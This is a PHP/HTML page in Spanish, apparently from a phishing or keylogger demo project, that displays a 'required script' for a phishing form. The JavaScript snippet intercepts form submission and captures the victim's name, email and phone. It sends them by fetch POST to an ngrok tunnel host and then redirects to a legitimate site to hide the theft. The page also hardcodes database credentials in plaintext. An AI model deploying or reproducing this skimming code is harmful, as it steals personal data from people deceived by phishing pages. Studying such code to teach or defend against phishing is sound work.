<?php
    ob_start(); // Habilita el buffer de salida
    session_start();
    
    $servername = "mysql-db";
    $username = "sea";
    $password = "proyectose@";
    $database = "bd_keyloggers"; 

    // Conexión
    $conn = mysqli_connect($servername, $username, $password, $database);
    if (!$conn) {
        die("Conexion fallida: " . mysqli_connect_error());
    }
?>

<!DOCTYPE html>
<html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Scripts - Phishing</title>
        
        <!-- Link hacia el archivo de estilos css -->
        <link rel="stylesheet" href="../css/scripts.css">

        <!-- Link favicon -->
        <link rel="shortcut icon" href="../img/logo.png" type="image/x-icon">

        <!-- Link para que funcionen los FA FA -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

        <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />        

    </head>


    <body>
        <!--CABECERA-->
        <div id="header">
            <div class="logo">
                <img src="../img/logo.png" alt="COACHING SL">
            </div>
            <nav>
                <ul>
                    <?php
                        echo "<li><a href='opciones.php'><i class='fa fa-home'></i> <span data-translate='inicio'>Inicio</span></a></li>";
                        echo "<li><a href='phishing.php'><i class='fa-solid fa-fish'></i> <span data-translate='phishing'>Phishing</span></a></li>";
                        echo '<br>';
                    ?>
                </ul>
            </nav>
        </div>

    <main>
 <!-- SOBRE LOS SCRIPTS -->
        <div class="cajascripts">
            <h2 class="scripts">Script necesario</h2>
        </div>
        <hr class="highlight"/> <!-- SEPARADOR-->

        <div class="individual">
            <div class="info_coaching">
                <div class="Centrar_info_coaching">
                    <div class="col-lg-12 text-center">
                        <h2 class="ApartadoCoachingTit">Keylogger</h2>
                        <div class="imageneess">
                        <p>
                        document.getElementById("infoForm").addEventListener("submit", function (e) { <br>
                            <br>
                        e.preventDefault(); <br>
                        <br>
                        const datos = { <br>
                            <br>
                        nombre_apellidos: document.querySelector('[name="nombre_apellidos"]').value, <br>
                        <br>
                        email: document.querySelector('[name="email"]').value, <br>
                        <br>
                        telefono: document.querySelector('[name="telefono"]').value <br>
                        <br>
                        }; <br>
                        <br>
                        fetch("https://b2fe-79-155-254-34.ngrok-free.app/guardar-formulario", { <br>
                            <br>
                        method: "POST", <br>
                        <br>
                        headers: { <br>
                            <br>
                            "Content-Type": "application/json" <br>
                            <br>
                        }, <br>
                        <br>
                        body: JSON.stringify(datos) <br>
                        <br>
                        }).finally(() => { <br>
                            <br>
                        window.location.href = "https://www.ifp.es"; <br>
                        <br>
                        }); <br>
                        });
                        </p>        
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <hr class="highlight"/> <!-- SEPARADOR-->
</main>
        <!-- PIE DE PAGINA -->
        <footer>
            Todos los derechos reservados | Keylogger SL Copyright © 2025
        </footer>

    </body>
</html>